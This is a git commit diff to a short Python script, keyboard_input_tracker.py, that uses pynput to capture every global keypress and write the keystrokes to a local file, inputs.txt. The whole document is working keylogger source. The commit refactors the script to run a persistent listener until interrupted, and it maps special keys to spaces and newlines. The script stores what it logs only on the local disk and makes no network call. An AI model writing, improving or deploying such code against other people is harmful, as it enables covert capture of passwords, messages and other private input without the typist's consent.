ef19157273c695b195dccb6af7d8d86f6d59f068
Hemlock Valor <143224038+beano143@users.noreply.github.com>
2023-11-08 15:39:29 -0600

    Update keyboard_input_tracker.py

--- minor_code/keyboard_input_tracker.py
+++ minor_code/keyboard_input_tracker.py
@@ -1,33 +1,32 @@
 from pynput import keyboard
-import time
 
 data = []
 
 def on_press(key):
-  try:
-    data.append(f'{key.char[0]}')
-  except AttributeError:
-    data.append(f'{key}')
-  return data
+    try:
+        data.append(f'{key.char[0]}')
+    except AttributeError:
+        data.append(f'{key}')
 
 def on_release(key):
     pass
 
 def read_fix_file(data):
-  with open ('inputs.txt', 'a') as file:
-    datal = ""
-    for obj in data:
-      if obj == "Key.enter":
-        datal += '\n'
-      else:
-        datal += obj
-    file.write(datal)
+    with open('inputs.txt', 'a') as file:
+        datal = ""
+        for obj in data:
+            if obj == "Key.enter":
+                datal += '\n'
+            elif obj in ["Key.alt", "Key.tab", "Key.shift", "Key.space"]:
+                datal += " "
+            else:
+                datal += obj
+        file.write(datal)
 
-while True:
-  try:
-    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-    listener.start()
-    read_fix_file(data)
+listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+listener.start()
 
-  except KeyboardInterrupt as e:
+try:
+    listener.join()
+except KeyboardInterrupt as e:
     read_fix_file(data)
